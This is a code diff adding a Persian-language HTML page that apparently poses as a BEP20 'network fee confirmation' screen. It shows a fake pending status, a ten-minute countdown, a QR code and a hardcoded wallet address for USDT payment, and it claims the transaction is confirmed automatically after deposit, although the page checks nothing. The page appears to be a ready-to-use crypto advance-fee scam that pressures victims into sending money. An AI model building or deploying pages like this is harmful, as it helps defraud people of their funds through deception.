@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تایید کارمزد شبکه | BEP20</title>
+    <style>
+        body { background-color: #0b111a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 10px; box-sizing: border-box; }
+        .fee-card { background: #1a202c; padding: 25px; border-radius: 20px; width: 100%; max-width: 380px; text-align: center; border: 1px solid #f0b90b; box-shadow: 0 0 20px rgba(240, 185, 11, 0.1); }
+        .status-box { background: rgba(240, 185, 11, 0.1); border: 1px solid #f0b90b; padding: 8px; border-radius: 10px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .dot { width: 8px; height: 8px; background: #f0b90b; border-radius: 50%; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
+        .timer { font-size: 22px; font-weight: bold; color: #f0b90b; margin: 10px 0; font-family: monospace; }
+        .qr-box { background: white; width: 150px; height: 150px; margin: 15px auto; padding: 10px; border-radius: 12px; }
+        .qr-box img { width: 100%; height: 100%; }
+        .warning { background: rgba(245, 101, 101, 0.1); border: 1px solid #f56565; color: #f56565; padding: 10px; border-radius: 10px; font-size: 12px; margin-bottom: 15px; font-weight: bold; }
+        .address-box { background: #0b111a; padding: 12px; border-radius: 8px; font-size: 11px; word-break: break-all; border: 1px solid #4a5568; color: #f0b90b; cursor: pointer; position: relative; }
+        .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; background-color: #f0b90b; color: black; font-weight: bold; cursor: pointer; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="fee-card">
+    <div class="status-box">
+        <div class="dot"></div>
+        <span style="font-size: 12px;">در انتظار تایید کارمزد شبکه...</span>
+    </div>
+
+    <div class="timer" id="countdown">10:00</div>
+
+    <div class="warning">
+        ⚠️ هشدار: فقط USDT روی شبکه (BEP20) ارسال کنید. ارسال روی سایر شبکه‌ها موجب از دست رفتن سرمایه می‌شود.
+    </div>
+
+    <div class="qr-box">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=0x9b6784c017d0a20781e8eabda6fb22b2397ddf0b" alt="QR Code">
+    </div>
+    
+    <p style="font-size: 11px; color: #a0aec0; margin-bottom: 5px;">آدرس واریز (BEP20):</p>
+    <div class="address-box" id="fee-addr" onclick="copyAddr()">0x9b6784c017d0a20781e8eabda6fb22b2397ddf0b</div>
+    
+    <button class="btn" onclick="copyAddr()">کپی آدرس و پرداخت</button>
+    <p id="copy-msg" style="color: #48bb78; font-size: 11px; margin-top: 8px; display: none;">آدرس کپی شد. پس از واریز، تراکنش خودکار تایید می‌شود.</p>
+</div>
+
+<script>
+    let time = 600; 
+    const countdownEl = document.getElementById('countdown');
+    setInterval(() => {
+        let minutes = Math.floor(time / 60);
+        let seconds = time % 60;
+        seconds = seconds < 10 ? '0' + seconds : seconds;
+        countdownEl.innerHTML = `${minutes}:${seconds}`;
+        if (time > 0) time--;
+    }, 1000);
+
+    function copyAddr() {
+        var addr = document.getElementById("fee-addr").innerText;
+        navigator.clipboard.writeText(addr);
+        document.getElementById("copy-msg").style.display = "block";
+        setTimeout(() => { document.getElementById("copy-msg").style.display = "none"; }, 3000);
+    }
+</script>
+
+</body>
+</html>
